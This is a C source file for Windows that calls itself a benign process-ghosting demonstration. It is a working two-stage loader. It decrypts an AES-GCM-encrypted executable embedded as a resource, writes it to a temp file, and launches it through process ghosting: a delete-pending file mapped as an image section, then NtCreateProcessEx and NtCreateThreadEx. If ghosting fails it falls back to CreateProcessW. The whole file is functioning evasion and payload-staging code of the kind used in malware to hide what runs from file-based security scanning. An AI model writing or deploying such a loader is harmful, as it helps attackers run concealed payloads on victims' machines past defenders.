/*
 * Benign two-stage process-ghosting demonstration.
 *
 * Reuse the repository's already-tested native PE ghosting implementation,
 * but replace its command-line frontend with an RCDATA stage2 frontend.  The
 * included implementation performs this sequence:
 *
 *   read PE -> write temporary file -> mark delete pending -> SEC_IMAGE
 *   -> close file -> NtCreateProcessEx -> write PEB process parameters and
 *   environment -> calculate entry point -> NtCreateThreadEx
 */
#define GHOST_USE_SOURCE_AS_BACKING_FILE 1
#define wmain ghosted_reference_wmain
#include "../ghosted.c"
#undef wmain

#include <string.h>
#include <windows.h>
#include <bcrypt.h>

#include "stage1_aes_key.h"
#include "stage1_resource.h"

#define STAGE1_AES_HEADER_SIZE 56
#define STAGE1_AES_NONCE_SIZE 12
#define STAGE1_AES_TAG_SIZE 16
#define STAGE1_AES_ALGORITHM_GCM 1

#pragma comment(lib, "bcrypt.lib")

static uint16_t Stage1ReadU16Le(const unsigned char* value) {
    return (uint16_t)value[0] | ((uint16_t)value[1] << 8);
}

static uint64_t Stage1ReadU64Le(const unsigned char* value) {
    uint64_t result = 0;
    for (unsigned int index = 0; index < 8; ++index) {
        result |= (uint64_t)value[index] << (index * 8);
    }
    return result;
}

static int DecryptEmbeddedStage2Aes(
    const unsigned char* package,
    size_t packageSize,
    unsigned char** decoded,
    size_t* decodedSize
) {
    uint16_t flags = 0;
    uint64_t plainSize = 0;
    uint64_t cipherSize = 0;
    const unsigned char* nonce = NULL;
    const unsigned char* tag = NULL;
    const unsigned char* cipher = NULL;
    unsigned char* buffer = NULL;
    unsigned char* keyObject = NULL;
    BCRYPT_ALG_HANDLE algorithm = NULL;
    BCRYPT_KEY_HANDLE key = NULL;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    DWORD keyObjectSize = 0;
    DWORD propertySize = 0;
    ULONG resultSize = 0;
    NTSTATUS status = 0;
    int success = 0;

    *decoded = NULL;
    *decodedSize = 0;
    if (!package || packageSize < STAGE1_AES_HEADER_SIZE ||
        memcmp(package, "BAES", 4) != 0 || package[4] != 1 ||
        package[5] != STAGE1_AES_ALGORITHM_GCM) {
        fprintf(stderr, "[-] Embedded stage2 AES header is invalid.\n");
        return 0;
    }

    flags = Stage1ReadU16Le(package + 6);
    plainSize = Stage1ReadU64Le(package + 8);
    cipherSize = Stage1ReadU64Le(package + 16);
    if (flags != 0 || plainSize == 0 || plainSize != cipherSize ||
        plainSize > SIZE_MAX || plainSize > ULONG_MAX ||
        cipherSize > SIZE_MAX - STAGE1_AES_HEADER_SIZE ||
        packageSize != STAGE1_AES_HEADER_SIZE + (size_t)cipherSize ||
        package[52] != 0 || package[53] != 0 ||
        package[54] != 0 || package[55] != 0) {
        fprintf(stderr, "[-] Embedded stage2 AES metadata is invalid.\n");
        return 0;
    }

    nonce = package + 24;
    tag = package + 36;
    cipher = package + STAGE1_AES_HEADER_SIZE;
    buffer = (unsigned char*)malloc((size_t)plainSize);
    if (!buffer) {
        fprintf(stderr, "[-] Stage2 AES allocation failed.\n");
        return 0;
    }

    status = BCryptOpenAlgorithmProvider(
        &algorithm,
        BCRYPT_AES_ALGORITHM,
        NULL,
        0);
    if (status < 0) {
        fprintf(stderr, "[-] BCryptOpenAlgorithmProvider failed: 0x%08lX\n",
            (unsigned long)status);
        goto cleanup;
    }
    status = BCryptSetProperty(
        algorithm,
        BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
        sizeof(BCRYPT_CHAIN_MODE_GCM),
        0);
    if (status < 0) {
        fprintf(stderr, "[-] BCryptSetProperty(GCM) failed: 0x%08lX\n",
            (unsigned long)status);
        goto cleanup;
    }
    status = BCryptGetProperty(
        algorithm,
        BCRYPT_OBJECT_LENGTH,
        (PUCHAR)&keyObjectSize,
        sizeof(keyObjectSize),
        &propertySize,
        0);
    if (status < 0 || propertySize != sizeof(keyObjectSize) ||
        keyObjectSize == 0) {
        fprintf(stderr, "[-] BCryptGetProperty failed: 0x%08lX\n",
            (unsigned long)status);
        goto cleanup;
    }
    keyObject = (unsigned char*)malloc(keyObjectSize);
    if (!keyObject) {
        fprintf(stderr, "[-] AES key allocation failed.\n");
        goto cleanup;
    }
    status = BCryptGenerateSymmetricKey(
        algorithm,
        &key,
        keyObject,
        keyObjectSize,
        (PUCHAR)STAGE1_AES_KEY,
        STAGE1_AES_KEY_SIZE,
        0);
    if (status < 0) {
        fprintf(stderr, "[-] BCryptGenerateSymmetricKey failed: 0x%08lX\n",
            (unsigned long)status);
        goto cleanup;
    }

    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)nonce;
    authInfo.cbNonce = STAGE1_AES_NONCE_SIZE;
    authInfo.pbTag = (PUCHAR)tag;
    authInfo.cbTag = STAGE1_AES_TAG_SIZE;
    status = BCryptDecrypt(
        key,
        (PUCHAR)cipher,
        (ULONG)cipherSize,
        &authInfo,
        NULL,
        0,
        buffer,
        (ULONG)plainSize,
        &resultSize,
        0);
    if (status < 0 || resultSize != (ULONG)plainSize) {
        fprintf(stderr, "[-] Embedded stage2 AES-GCM authentication failed: "
            "0x%08lX\n", (unsigned long)status);
        goto cleanup;
    }

    *decoded = buffer;
    *decodedSize = (size_t)plainSize;
    buffer = NULL;
    printf("[+] Embedded stage2 AES-GCM decrypted and verified (%zu bytes).\n",
        *decodedSize);
    success = 1;

cleanup:
    if (key) {
        BCryptDestroyKey(key);
    }
    if (algorithm) {
        BCryptCloseAlgorithmProvider(algorithm, 0);
    }
    if (keyObject) {
        SecureZeroMemory(keyObject, keyObjectSize);
        free(keyObject);
    }
    if (buffer) {
        SecureZeroMemory(buffer, (size_t)plainSize);
        free(buffer);
    }
    return success;
}

static int ValidateEmbeddedStage2X64Pe(
    const unsigned char* image,
    size_t imageSize
) {
    const IMAGE_DOS_HEADER* dosHeader = NULL;
    const IMAGE_NT_HEADERS64* ntHeaders = NULL;
    size_t ntOffset = 0;
    size_t sectionTableOffset = 0;
    size_t sectionTableSize = 0;

    if (!image || imageSize < sizeof(IMAGE_DOS_HEADER)) {
        return 0;
    }
    dosHeader = (const IMAGE_DOS_HEADER*)image;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE || dosHeader->e_lfanew < 0) {
        return 0;
    }

    ntOffset = (size_t)dosHeader->e_lfanew;
    if (ntOffset > imageSize ||
        imageSize - ntOffset < sizeof(IMAGE_NT_HEADERS64)) {
        return 0;
    }
    ntHeaders = (const IMAGE_NT_HEADERS64*)(image + ntOffset);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE ||
        ntHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
        ntHeaders->FileHeader.NumberOfSections == 0 ||
        ntHeaders->FileHeader.SizeOfOptionalHeader !=
            sizeof(IMAGE_OPTIONAL_HEADER64) ||
        ntHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC ||
        ntHeaders->OptionalHeader.AddressOfEntryPoint == 0) {
        return 0;
    }

    sectionTableOffset = ntOffset +
        offsetof(IMAGE_NT_HEADERS64, OptionalHeader) +
        ntHeaders->FileHeader.SizeOfOptionalHeader;
    sectionTableSize = (size_t)ntHeaders->FileHeader.NumberOfSections *
        sizeof(IMAGE_SECTION_HEADER);
    if (sectionTableOffset > imageSize ||
        sectionTableSize > imageSize - sectionTableOffset) {
        return 0;
    }
    return 1;
}

static int WriteEmbeddedStage2(
    wchar_t* outputPath,
    DWORD outputPathCount
) {
    HMODULE module = GetModuleHandleW(NULL);
    HRSRC resource = NULL;
    HGLOBAL loaded = NULL;
    const unsigned char* package = NULL;
    DWORD packageSize = 0;
    unsigned char* image = NULL;
    size_t imageSize = 0;
    wchar_t tempDirectory[MAX_PATH] = { 0 };
    wchar_t tempName[MAX_PATH] = { 0 };
    HANDLE file = INVALID_HANDLE_VALUE;
    DWORD written = 0;
    int success = 0;

    if (!module) {
        PrintWin32Error("GetModuleHandleW(stage2)");
        return 0;
    }
    resource = FindResourceW(
        module,
        MAKEINTRESOURCEW(IDR_STAGE2_LOADER),
        MAKEINTRESOURCEW(10));
    if (!resource) {
        PrintWin32Error("FindResourceW(stage2)");
        return 0;
    }
    packageSize = SizeofResource(module, resource);
    loaded = LoadResource(module, resource);
    package = loaded
        ? (const unsigned char*)LockResource(loaded)
        : NULL;
    if (!package || !DecryptEmbeddedStage2Aes(
            package,
            packageSize,
            &image,
            &imageSize)) {
        return 0;
    }
    if (imageSize > MAXDWORD ||
        !ValidateEmbeddedStage2X64Pe(image, imageSize)) {
        fprintf(stderr, "[-] Embedded stage2 is not a valid x64 PE.\n");
        goto cleanup;
    }

    if (!GetTempPathW(ARRAYSIZE(tempDirectory), tempDirectory) ||
        !GetTempFileNameW(tempDirectory, L"B2S", 0, tempName)) {
        PrintWin32Error("Create stage2 source path");
        goto cleanup;
    }
    if (wcslen(tempName) + 1 > outputPathCount) {
        DeleteFileW(tempName);
        SetLastError(ERROR_INSUFFICIENT_BUFFER);
        PrintWin32Error("Copy stage2 source path");
        goto cleanup;
    }

    file = CreateFileW(
        tempName,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY,
        NULL);
    if (file == INVALID_HANDLE_VALUE) {
        PrintWin32Error("CreateFileW(stage2 source)");
        DeleteFileW(tempName);
        goto cleanup;
    }
    if (!WriteFile(file, image, (DWORD)imageSize, &written, NULL) ||
        written != (DWORD)imageSize ||
        !FlushFileBuffers(file)) {
        PrintWin32Error("WriteFile(stage2 source)");
        goto cleanup;
    }

    wcscpy_s(outputPath, outputPathCount, tempName);
    printf("[+] Embedded stage2 PE materialized for ghosting.\n");
    success = 1;

cleanup:
    if (file != INVALID_HANDLE_VALUE) {
        CloseHandle(file);
    }
    if (image) {
        SecureZeroMemory(image, imageSize);
        free(image);
    }
    if (!success) {
        DeleteFileW(tempName);
    }
    return success;
}

static int HasCommandLineArgument(
    int argc,
    wchar_t* argv[],
    const wchar_t* expected
) {
    for (int index = 1; index < argc; ++index) {
        if (wcscmp(argv[index], expected) == 0) {
            return 1;
        }
    }
    return 0;
}

static int AppendStage2Arguments(
    WIDE_BUFFER* commandLine,
    LPCWSTR stage2Path,
    int argc,
    wchar_t* argv[]
) {
    if (!AppendCommandLineArgument(commandLine, stage2Path)) {
        return 0;
    }
    for (int index = 1; index < argc; ++index) {
        if (!AppendCommandLineArgument(commandLine, argv[index])) {
            return 0;
        }
    }
    return 1;
}

static int LaunchStage2CompatibilityProcess(
    LPWSTR commandLine,
    LPCWSTR currentDirectory,
    DWORD* exitCode
) {
    STARTUPINFOW startupInfo;
    PROCESS_INFORMATION processInfo;
    DWORD waitResult = 0;

    ZeroMemory(&startupInfo, sizeof(startupInfo));
    ZeroMemory(&processInfo, sizeof(processInfo));
    startupInfo.cb = sizeof(startupInfo);
    if (!CreateProcessW(
            NULL,
            commandLine,
            NULL,
            NULL,
            FALSE,
            CREATE_NEW_CONSOLE,
            NULL,
            currentDirectory,
            &startupInfo,
            &processInfo)) {
        PrintWin32Error("CreateProcessW(stage2 compatibility)");
        return 0;
    }

    CloseHandle(processInfo.hThread);
    waitResult = WaitForSingleObject(processInfo.hProcess, INFINITE);
    if (waitResult != WAIT_OBJECT_0) {
        PrintWin32Error("WaitForSingleObject(stage2 compatibility)");
        CloseHandle(processInfo.hProcess);
        return 0;
    }
    if (!GetExitCodeProcess(processInfo.hProcess, exitCode)) {
        PrintWin32Error("GetExitCodeProcess(stage2 compatibility)");
        CloseHandle(processInfo.hProcess);
        return 0;
    }

    CloseHandle(processInfo.hProcess);
    printf("[+] Stage2 compatibility process completed with exit code %lu.\n",
        *exitCode);
    return 1;
}

int wmain(int argc, wchar_t* argv[]) {
    wchar_t stage2Path[MAX_PATH] = { 0 };
    wchar_t* currentDirectory = NULL;
    WIDE_BUFFER commandLine = { 0 };
    DWORD exitCode = 1;
    int result = 1;

    if (!WriteEmbeddedStage2(stage2Path, ARRAYSIZE(stage2Path))) {
        return 1;
    }
    if (HasCommandLineArgument(argc, argv, L"--decode-only")) {
        printf("[+] Stage1 decode-only AES-GCM verification passed.\n");
        result = 0;
        goto cleanup;
    }
    currentDirectory = GetContainingDirectory(stage2Path);
    if (!currentDirectory) {
        currentDirectory = _wcsdup(L"C:\\Windows\\System32");
    }
    if (!currentDirectory ||
        !AppendStage2Arguments(&commandLine, stage2Path, argc, argv)) {
        fprintf(stderr, "[-] Failed to prepare stage2 process parameters.\n");
        goto cleanup;
    }

    if (!CreateHiddenProcessFromPE(
            stage2Path,
            commandLine.Data,
            currentDirectory,
            TRUE,
            &exitCode)) {
        fprintf(stderr,
            "[i] Stage2 ghost creation is unavailable; retrying with the "
            "CreateProcessW compatibility path.\n");

        /* The ghosting attempt marks its image source delete-pending. Create
           a fresh authenticated Stage2 image for the compatibility launch. */
        stage2Path[0] = L'\0';
        free(commandLine.Data);
        ZeroMemory(&commandLine, sizeof(commandLine));
        free(currentDirectory);
        currentDirectory = NULL;
        if (!WriteEmbeddedStage2(stage2Path, ARRAYSIZE(stage2Path))) {
            goto cleanup;
        }
        currentDirectory = GetContainingDirectory(stage2Path);
        if (!currentDirectory) {
            currentDirectory = _wcsdup(L"C:\\Windows\\System32");
        }
        if (!currentDirectory ||
            !AppendStage2Arguments(&commandLine, stage2Path, argc, argv)) {
            fprintf(stderr,
                "[-] Failed to prepare the Stage2 compatibility process.\n");
            goto cleanup;
        }
        if (!LaunchStage2CompatibilityProcess(
                commandLine.Data,
                currentDirectory,
                &exitCode)) {
            fprintf(stderr, "[-] Stage2 compatibility process failed.\n");
            goto cleanup;
        }
    } else {
        printf("[+] Stage2 ghost process completed with exit code %lu.\n",
            exitCode);
    }
    result = exitCode == 0 ? 0 : 1;

cleanup:
    if (stage2Path[0] && !DeleteFileW(stage2Path)) {
        DWORD error = GetLastError();
        if (error != ERROR_FILE_NOT_FOUND) {
            SetLastError(error);
            PrintWin32Error("DeleteFileW(stage2 source)");
        }
    }
    free(commandLine.Data);
    free(currentDirectory);
    return result;
}
